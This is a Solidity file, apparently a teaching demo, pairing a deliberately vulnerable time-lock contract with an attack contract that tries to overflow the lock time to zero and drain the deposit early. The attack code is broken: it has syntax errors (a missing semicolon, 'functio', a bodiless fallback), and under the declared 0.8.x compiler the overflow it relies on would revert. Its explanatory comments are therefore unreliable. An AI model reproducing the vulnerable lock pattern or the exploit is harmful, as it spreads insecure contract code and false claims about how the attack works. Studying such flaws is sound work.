// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract FaultyTimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTimte(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");

        require(sent, "failed to send Ether");
    }
}


contract AttackTimeLock {
    FaultyTimeLock timeLock;

    constructor(FaultyTimeLock _timeLockAddress) {
        timeLock = FaultyTimeLock(_timeLockAddress)
    }
    fallback() external payable() //so that it can recieve ether

    functio attack() public payable{
        timeLock.deposit{value: msg.value}();


        //uints can go uptil 2**256 - 1   (-1 since the first number is 0) 
        //we want to overflow the uint, so that the locktime value is equal to 0

        // to do so we get the current blocktime uint and we subtract that number from the uint max range
        // 2**256 = type(uint).max + 1
        // 2**256 - currentTimelock = amount remaining to overflow
        timeLock.increaseLockTimte(type(uint).max + 1 - timeLock.lockTime(address(this)));

        //we will be able to call withdraw immediately since timeLock will be 0
        timeLock.withdraw();
    }


}